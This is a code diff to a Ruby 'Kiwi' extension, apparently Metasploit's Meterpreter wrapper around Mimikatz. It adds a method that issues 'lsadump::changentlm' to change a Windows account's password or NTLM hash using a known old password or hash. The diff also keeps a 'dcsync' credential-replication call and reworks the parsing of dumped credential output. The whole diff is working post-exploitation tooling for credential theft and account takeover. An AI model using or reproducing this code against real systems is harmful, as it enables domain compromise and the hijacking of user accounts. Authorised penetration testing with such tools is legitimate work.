@@ -53,6 +53,42 @@ class Kiwi < Extension
     output[output.index("\n") + 1, output.length]
   end
 
+  def password_change(opts)
+    cmd = "lsadump::changentlm /user:#{opts[:user]}"
+    cmd << " /server:#{opts[:server]}" if opts[:server]
+    cmd << " /oldpassword:#{opts[:old_pass]}" if opts[:old_pass]
+    cmd << " /oldntlm:#{opts[:old_hash]}" if opts[:old_hash]
+    cmd << " /newpassword:#{opts[:new_pass]}" if opts[:new_pass]
+    cmd << " /newntlm:#{opts[:new_hash]}" if opts[:new_hash]
+
+    output = exec_cmd("\"#{cmd}\"")
+    result = {}
+
+    if output =~ /^OLD NTLM\s+:\s+(\S+)\s*$/m
+      result[:old] = $1
+    end
+    if output =~ /^NEW NTLM\s+:\s+(\S+)\s*$/m
+      result[:new] = $1
+    end
+
+    if output =~ /^ERROR/m
+      result[:success] = false
+      if output =~ /^ERROR.*SamConnect/m
+        result[:error] = 'Invalid server.'
+      elsif output =~ /^ERROR.*Bad old/m
+        result[:error] = 'Invalid old password or hash.'
+      elsif output =~ /^ERROR.*SamLookupNamesInDomain/m
+        result[:error] = 'Invalid user.'
+      else
+        result[:error] = 'Unknown error.'
+      end
+    else
+      result[:success] = true
+    end
+
+    result
+  end
+
   def dcsync(domain_user)
     exec_cmd("\"lsadump::dcsync /user:#{domain_user}\"")
   end
@@ -271,11 +307,18 @@ class Kiwi < Extension
       # did we find something?
       next if line.blank?
 
-      # the next 4 lines should be interesting
       msv = {}
-      4.times do
-        k, v = read_value(lines.shift)
-        msv[k.strip] = v if k
+      # loop until we find a line that doesn't start with
+      # an asterisk, as this is the next credential set
+      loop do
+        line = lines.shift
+        if line.strip.start_with?('*')
+          k, v = read_value(line)
+          msv[k.strip] = v if k
+        else
+          lines.unshift(line)
+          break
+        end
       end
 
       if msv.length > 0
